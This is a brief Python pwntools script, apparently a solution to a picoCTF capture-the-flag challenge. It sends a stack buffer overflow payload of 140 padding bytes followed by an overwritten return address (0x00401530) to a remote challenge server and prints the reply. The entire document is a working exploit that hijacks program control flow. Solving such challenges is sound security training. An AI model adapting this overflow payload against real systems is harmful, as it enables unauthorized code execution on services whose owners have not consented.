from pwn import *

p = (b"A" * 140) + b"\x30\x15\x40\x00"
r = remote("saturn.picoctf.net", 50539)
r.recvuntil("Give me a string!")
r.sendline(p)
resp = r.recvall()
r.close()
print(resp)
